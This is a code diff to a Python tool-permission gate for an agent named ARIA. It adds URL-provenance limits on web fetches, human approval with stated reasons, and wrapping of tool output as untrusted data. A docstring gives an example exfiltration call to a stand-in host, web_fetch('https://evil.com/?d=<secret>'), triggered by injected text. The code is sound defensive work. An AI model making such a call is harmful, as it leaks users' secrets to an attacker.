@@ -6,13 +6,19 @@ Deny by default. A call runs only if:
   1. the tool is registered in SPECS,
   2. every argument is declared, required ones are present, and all values pass validation,
   3. the per-turn budget for the tool's risk tier is not used up,
-  4. for "write" tools, a human approved it (no approver → denied, never auto-approved).
+  4. for "write" tools, a human approved it (no approver → denied, never auto-approved),
+  5. for web_fetch (when provenance is on), the URL came from this turn's search
+     results or the user's own message — otherwise a human must approve it.
+     This blocks exfiltration like web_fetch("https://evil.com/?d=<secret>")
+     requested by injected text.
 
 Both agent.py and mcp_agent_server.py call tools only through ToolGate.
 Program code that picks its own arguments (e.g. the forced search in agent.py)
 may call tools.py directly.
 """
 
+import re
+import urllib.parse
 from collections import Counter
 from dataclasses import dataclass
 from typing import Callable, Optional
@@ -44,6 +50,15 @@ def Int(lo: int, hi: int):
             raise Denied("must be an integer")
         if not lo <= v <= hi:
             raise Denied(f"must be between {lo} and {hi}")
+        return v
+    return check
+
+
+def Match(pattern: str):
+    rx = re.compile(pattern)
+    def check(v):
+        if not isinstance(v, str) or not rx.fullmatch(v):
+            raise Denied(f"must match {pattern}")
         return v
     return check
 
@@ -111,30 +126,68 @@ SPECS = {
 # Max allowed calls per risk tier per turn — stops runaway tool loops.
 DEFAULT_BUDGET = {"none": 3, "read": 6, "network": 6, "write": 3}
 
-Approver = Callable[[str, dict], bool]
+# approver(tool_name, cleaned_args, reason) → True to allow
+Approver = Callable[[str, dict, str], bool]
+
+_URL_RE = re.compile(r"https?://[^\s<>\"'()\[\]{}]+", re.IGNORECASE)
+
+
+def _norm_url(url: str) -> str:
+    """Canonical form for provenance comparison: no fragment, no trailing slash
+    or punctuation, lowercase scheme and host."""
+    p = urllib.parse.urlsplit(url.strip().rstrip(".,;:!?"))
+    return urllib.parse.urlunsplit(
+        (p.scheme.lower(), p.netloc.lower(), p.path.rstrip("/"), p.query, ""))
+
+
+def wrap_untrusted(tool_name: str, text: str, tag: str = "tool_output") -> str:
+    """Tag tool output as data. Neutralise a fake closing tag inside the content
+    so injected text can't 'escape' the wrapper."""
+    text = re.sub(rf"</\s*{tag}", f"&lt;/{tag}", text, flags=re.IGNORECASE)
+    return f'<{tag} tool="{tool_name}" trusted="false">\n{text}\n</{tag}>'
 
 
 class ToolGate:
     """
-    confirm: asks a human to approve a write call; None means non-interactive,
-             so every write is denied.
-    budget:  per-turn limits by risk tier; None disables budgeting (for hosts
-             with no notion of a turn, e.g. the MCP server).
+    confirm:    asks a human to approve a call; None means non-interactive, so
+                anything needing approval is denied.
+    budget:     per-turn limits by risk tier; None disables budgeting (for hosts
+                with no notion of a turn, e.g. the MCP server).
+    provenance: restrict web_fetch to URLs seen this turn (search results or the
+                user's message). Off for MCP, where the server cannot see the
+                user's message and the MCP client approves each call.
+    specs:      tool registry; defaults to SPECS.
     """
 
-    def __init__(self, confirm: Optional[Approver], budget: Optional[dict] = DEFAULT_BUDGET):
+    def __init__(self, confirm: Optional[Approver], budget: Optional[dict] = DEFAULT_BUDGET,
+                 provenance: bool = True, specs: Optional[dict] = None):
         self.confirm = confirm
         self.budget = budget
+        self.provenance = provenance
+        self.specs = SPECS if specs is None else specs
         self.used = Counter()
+        self.allowed_urls = set()
 
-    def new_turn(self) -> None:
+    def new_turn(self, user_text: str = "") -> None:
         self.used.clear()
+        self.allowed_urls.clear()
+        self.allow_urls_from(user_text)
+
+    def allow_urls_from(self, text: str) -> None:
+        """Record URLs that may be fetched this turn (user text, search results)."""
+        self.allowed_urls.update(_norm_url(u) for u in _URL_RE.findall(text or ""))
+
+    def _approve(self, name: str, clean: dict, reason: str) -> None:
+        if self.confirm is None:
+            raise Denied(f"{reason}; human approval is unavailable in non-interactive mode")
+        if not self.confirm(name, clean, reason):
+            raise Denied(f"the user declined {name} ({reason})")
 
     def check(self, name: str, args) -> tuple:
         """Return (spec, cleaned_args) or raise Denied. Approval happens last."""
-        spec = SPECS.get(name)
+        spec = self.specs.get(name)
         if spec is None:
-            raise Denied(f"unknown tool '{name}'. Available: {list(SPECS)}")
+            raise Denied(f"unknown tool '{name}'. Available: {list(self.specs)}")
         if not isinstance(args, dict):
             raise Denied("arguments must be a JSON object")
         unknown = set(args) - set(spec.args)
@@ -152,10 +205,10 @@ class ToolGate:
         if self.budget is not None and self.used[spec.risk] >= self.budget[spec.risk]:
             raise Denied(f"per-turn limit for {spec.risk} tools reached; answer with what you have")
         if spec.risk == "write":
-            if self.confirm is None:
-                raise Denied(f"{name} needs human approval, which is unavailable in non-interactive mode")
-            if not self.confirm(name, clean):
-                raise Denied(f"the user declined {name}")
+            self._approve(name, clean, f"{name} writes persistent memory")
+        if (name == "web_fetch" and self.provenance
+                and _norm_url(clean["url"]) not in self.allowed_urls):
+            self._approve(name, clean, "URL is not from this turn's search results or your message")
         return spec, clean
 
     def call(self, name: str, args) -> tuple:
@@ -166,16 +219,20 @@ class ToolGate:
             return f"Denied by policy: {e}", False
         self.used[spec.risk] += 1
         try:
-            return spec.fn(**clean), True
+            result = spec.fn(**clean)
         except Exception as e:
             return f"Tool error: {e}", False
+        if name == "web_search":
+            self.allow_urls_from(result)
+        return result, True
 
 
-def ask_in_terminal(name: str, args: dict) -> bool:
+def ask_in_terminal(name: str, args: dict, reason: str) -> bool:
     """Interactive approver for the CLI."""
     shown = ", ".join(f"{k}={v!r:.60}" for k, v in args.items())
     try:
-        reply = input(f"\n  ⚠ ARIA wants to run {name}({shown})\n    Allow? [y/N] ")
+        reply = input(f"\n  ⚠ ARIA wants to run {name}({shown})\n"
+                      f"    Why approval is needed: {reason}\n    Allow? [y/N] ")
     except EOFError:
         return False
     return reply.strip().lower() == "y"
